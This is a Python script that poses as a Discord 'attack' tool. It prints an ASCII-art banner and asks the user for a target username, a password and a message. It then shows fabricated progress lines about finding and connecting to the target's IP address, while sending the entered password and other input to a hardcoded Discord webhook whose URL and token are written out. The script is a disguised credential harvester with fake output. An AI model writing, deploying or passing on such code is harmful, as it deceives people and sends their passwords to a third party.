
import requests
import random
art = '''
############*********#*-:=*+++++++++++++++=+++++==================++++
###########*********##*:=*+++++++++++++++++===+++=================++++
#########**********###+-++++++++++++++++++++======================++++
#######************###+=++++++++++++++++++=========================+++
#####************+*###=+++++++++++++++++===========================+++
####*****++++***++####=++++++++++++==++=========================--==**
####***++++++***++####*=-::::--::...=+=++=====================------=+
###***++++++****+####::...:...........-==+==================------===+
###*++++++++***==##=.....::.............-================---------====
###*++++++++***=++-.......:.::...........===============----------====
###*+++++++***=-+-...::...::............  .-============---------====-
###**++++*****=--:..-:.:..--:.......       .-=============-------===+-
###**+++*++#**==:.:-=-:...---:.... .        :=============------===+=-
###****++=+**-=-::----:.:.----.....       .  -+===========----=====---
####****+++=+==----------:=+--:.....          -+===========-====*-----
#######***++===-=--=--=---===--:..  .         .=+=======------+*------
######**#*+=====----==----====--.              -=-------::::=+**------
#####*****+===----===-----=-===-:.. ...        .:-----::::-==+#*=-----
#######**+====--=====------:-===:......      .  .-:-----=--=+*##+-----
#####****+=-=--==+=-=----=:...:==:......     .. ..:--=--=--+*##%#+----
++++++++++==-=======-----=.....:-......  .    ....=+===-=-+*#%####+-*#
++++++++*+========+=---=-:......=:.....:... . .. .-===-==***#%#####=+#
++++++++++=+==+======-=+-.......:-.....:...........=====+#**##%#####+=
+++++++++++++=+++====-=+=:......:-:-.......:......:===+******########+
+++++++++==++++======-=--:::....:=--..:.-...:......-++****#***#%%#####
+++++++=+++==+======--=-::::....:=--.::.-:...:.....:*****##****#######
+++++++=++++=+======---=-::::::::---.::.-:...-:..-.-##***##****#######
++++++#=+++++++=++==-==-:+%%%%%#=----::.:=-..:-:.:.-####*##*****######
++++=+##++++++=++===-====*#*--=*@=-----::=-:.:-:..-=*###*##******#%###
+++==*##+++++==+======-:-::+::::+------:-==-.:---.:-*###*##*******####
++===#%#+++++++*++==+=---:==:------==----+==:.:-::--*######*******####
=====+%*++++++*+===-==-----=--=============--:-----=*#######****#**###
==---+%++++++*===-=+---------======-====+====::-----########****#**###
-----#%++++++++--+=-:--------====*-=====+==-+-------+#######****#*#%%#
:-::::#++++++=+=+=-::::-------====--====+---=----+::+#######******###%
:::::::=+++++++++---::::--------=--=====-+--==-------+######****######
:::::::=+++++*++---:::::::--------=+====---=++----+--+###********#####
:::::.:===+=++=---:::::::::::---======-=--======--=---*##**********###
::::::--===++==---:::::::::::::-===-==--=====+==--=---+#*****++**+**##
:::::---===+=-=--:-====-:::::::=+=======*#+====---=----#****++++*+**##
::::----====--=:::-+++++-:::::==+======+*#*=====--=-=--*****++++*++*#%
--==----====---=:::+++--=-::-:::=========#======--=-----*******+*+**#%
--:-=======-----::::+----:::::::-========#+=====--=*+--=************#%
--=+++===+=-=--==:::----::::::::-========#+=====--=#+--*+*******#**##%
--=+++++++=--=---=:::::::::::::=======++=***==+=--=#+--#-###****#**#%%
==+++++++==--==--==:::::::::::-=======**==++====-==*+--*-###****#**#%%
+++++++*+===--=---=-:::::::---========*#*=========+*=-+*=###****#**##%
+++++++*+==----=--==-=:::+===-===-===+###*+====+==**==*+**##****#**##%
=++++++*+====---===-==++==#*---==-*-+%##%#%*+==+==*=-+#=*####***#**##%
+++=+++++====----===++++*###+-=--=*-=######*::-+=-*--++**+*##*###**#%%
++++++==+============**+####=-===*==#####*#*:  ..:::.:.:--=-+*###**#%%
*+++++=-++==--==++*++++*###**===+**######*##+:...:  .  :.--::=###**#%%
+++++++==+==--=++++++==*####*+**+**##********+:.....:..+::::::-#%###%%
=*+++++++==-=+*++++=+=*#****##++++=******+++*+:.:...::.--------*%#+=##
=====++++=-+**++=+++++##*+***#=++++**+++==--=++-=:..-:.::-:....:++--#%
=====++++=+***+++++++%#*++++***+=**+++==--::=*==*==-===:::.    .:-:-#%
===+=++===+**++++++**#*==+++++++=++==--:::...=+-*====++-::.     :::--#
===++++===+***+=*+*#%#+======+=+=---:::......-+-+====+=+::..   .:. .:*
===+++++===+++==**#%##=-====+=--:::.......:..:+=-====+++=::..  ::.  .:
===+++++==++=--=**#%#+-=+==--::......   .:. ..=*=-+===+++-:..  ---.  .
-===+++++=+=--==###%#==+===-......      .. ...:=+-====+===::..:-=-:.  
-====++++===--==*###==++++==::.           ...   +*=*++++++=::.+++=--: 
--===++++***=--=*#+-.:::=+++::           --.:--.=*=*#*++*++=::++*+++=+
----====+***=--+*=-:-+-:  -+=. .:.    .-..  ....:+=+*%*++*++=-+**+++++
----======**=--**:::-=-:    :-..--.::--. ..:---::+*+*####**+++*++*++*+
-=========+*+-=*+-::+-::...    ..=-..::::---==---:==-+#%###*++*+=+*+=-
+++++*******#-**::.-#=..::. .::      ..::-:.:...::-+==*%%%####*+++++=-
+++++++====+*+#-..=*#-      ...  ...   ...:.::::::-=+==*%#####*++++++-
=-----------+*=::-*+*.:              .   ....:+=+==+*+=+#######++*==++
------------+..:-*+=* -    ........     ..+*+:.......==****#%##%**=-**

'''
print(art)

random_number = random.randint(10**(18), 10**(19)-1)

def send_to_discord_webhook(webhook_url, user_input, target_username, password):
    data = {
        "embeds": [{
            "title": "Attack Information",
            "description": f"User: {target_username}\nPassword: {password}\nMessage: {user_input}",
            "color": 17268  # Color code for the embed (adjust as needed)
        }]
    }

    response = requests.post(webhook_url, json=data, timeout=10)

    if response.ok:
        print("Message sent to Discord successfully.")
    else:
        print(f"Failed to send message. Status code: {response.status_code}")
        print(response.text)  # Print the response content for debugging

if __name__ == "__main__":
    webhook_url = "https://discord.com/api/webhooks/1201064019180671078/y4ca3vW2pUvibHefABDUtTOFGjhU4KDVR1FmRs4sKw_t4hMFM6uLJb2PwAVZJCobuxCT"
    user_input = input("Enter information to send: ")
    target_username = input("Target Username: ")
    password = input("Password: ")

    class ConsoleColors:
        HEADER = '\033[95m'
        OKBLUE = '\033[94m'
        OKGREEN = '\033[92m'
        WARNING = '\033[93m'
        FAIL = '\033[91m'
        ENDC = '\033[0m'

    print("Logging in using " + password)
    print(ConsoleColors.WARNING + f"Searching for {target_username} Id{random_number}'s IP address through Discord.com..." + ConsoleColors.ENDC)
    print(ConsoleColors.OKGREEN + f"Found {target_username} IP address" + ConsoleColors.ENDC)
    print(ConsoleColors.FAIL + f"Attempting to connect to {target_username} #0 IP address'..." + ConsoleColors.ENDC)
    print(ConsoleColors.OKBLUE + "Successful Connected. Choose What Type To Attack.." + ConsoleColors.ENDC)

    choice = input(ConsoleColors.OKBLUE + "Government Crime#1." + ConsoleColors.ENDC)

    send_to_discord_webhook(webhook_url, user_input, target_username, password,)
